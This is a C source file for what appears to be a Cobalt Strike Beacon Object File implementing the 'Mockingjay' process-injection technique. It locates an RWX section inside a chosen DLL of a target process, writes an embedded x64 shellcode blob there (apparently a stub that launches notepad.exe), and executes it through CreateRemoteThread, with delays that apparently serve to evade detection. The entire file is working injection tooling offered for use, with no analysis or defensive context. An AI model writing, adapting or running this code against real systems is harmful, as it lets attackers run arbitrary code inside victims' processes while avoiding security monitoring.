#include <windows.h>
#include "beacon.h"
#include "mockingjay_common.h"

void ___chkstk_ms() { }

WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
DECLSPEC_IMPORT BOOL WINAPI PSAPI$EnumProcessModulesEx(HANDLE hProcess, HMODULE *lphModule, DWORD cb, LPDWORD lpcbNeeded, DWORD dwFilterFlag);
DECLSPEC_IMPORT DWORD WINAPI PSAPI$GetModuleFileNameExA(HANDLE hProcess, HMODULE hModule, LPSTR lpFilename, DWORD nSize);
WINBASEAPI WINBOOL WINAPI KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
WINBASEAPI VOID WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);

static int run_mockingjay_sleep(DWORD processId, const char *moduleName, ULONG_PTR offset) {
    HANDLE hProcess = NULL;
    HMODULE hModules[1024];
    DWORD cbNeeded = 0;
    HMODULE hDll = NULL;
    PVOID rwxSection = NULL;
    INT i = 0;

    unsigned char shellcode[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00";

    hProcess = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to Open Process %lu. Error Code: %lu\n", (unsigned long)processId, (unsigned long)KERNEL32$GetLastError());
        return 1;
    }

    if (!PSAPI$EnumProcessModulesEx(hProcess, hModules, sizeof(hModules), &cbNeeded, 0x03)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to Enumerate Modules. Error Code: %lu\n", (unsigned long)KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hProcess);
        return 1;
    }

    for (i = 0; i < (INT)(cbNeeded / sizeof(HMODULE)); i++) {
        CHAR szModName[MAX_PATH];
        if (PSAPI$GetModuleFileNameExA(hProcess, hModules[i], szModName, sizeof(szModName))) {
            if (mj_module_matches(szModName, moduleName)) {
                hDll = hModules[i];
                break;
            }
        }
    }

    if (hDll == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to find module '%s' in PID %lu (error: %lu)\n", moduleName, (unsigned long)processId, (unsigned long)KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hProcess);
        return 1;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Remote DLL Address: %p\n", hDll);

    rwxSection = (PVOID)((ULONG_PTR)hDll + offset);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Remote RWX Section Address: %p\n", rwxSection);

    KERNEL32$Sleep(5000);

    if (!KERNEL32$WriteProcessMemory(hProcess, rwxSection, shellcode, sizeof(shellcode), NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] WriteProcessMemory Failed: %lu\n", (unsigned long)KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hProcess);
        return 1;
    }

    KERNEL32$Sleep(10000);

    if (!KERNEL32$CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rwxSection, NULL, 0, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to Create Thread in Remote Process and Execute. Error Code: %lu\n", (unsigned long)KERNEL32$GetLastError());
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Shellcode Successfully Executed in Remote Thread\n");
    }

    KERNEL32$CloseHandle(hProcess);
    return 0;
}

void go(char *buff, int len) {
    datap parser;
    DWORD processId = 0;
    char *moduleName = NULL;
    char *offsetStr = NULL;
    ULONG_PTR offset = 0;

    if (len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Usage: bof-mockingjay-api-sleep --- <pid> <module> <offset>\n");
        return;
    }

    BeaconDataParse(&parser, buff, len);
    processId = (DWORD)BeaconDataInt(&parser);
    moduleName = BeaconDataExtract(&parser, NULL);
    offsetStr = BeaconDataExtract(&parser, NULL);

    if (!processId || !moduleName || !moduleName[0] || !offsetStr || !offsetStr[0]) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Usage: bof-mockingjay-api-sleep --- <pid> <module> <offset>\n");
        BeaconPrintf(CALLBACK_ERROR, "[!] Example: bof-mockingjay-api-sleep --- 1234 ntdll.dll 0x1EC000\n");
        return;
    }

    offset = mj_parse_offset(offsetStr);
    if (offset == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Invalid offset: %s\n", offsetStr);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target PID: %lu\n[*] Module: %s\n[*] Offset: 0x%llx\n", (unsigned long)processId, moduleName, (unsigned long long)offset);
    run_mockingjay_sleep(processId, moduleName, offset);
}
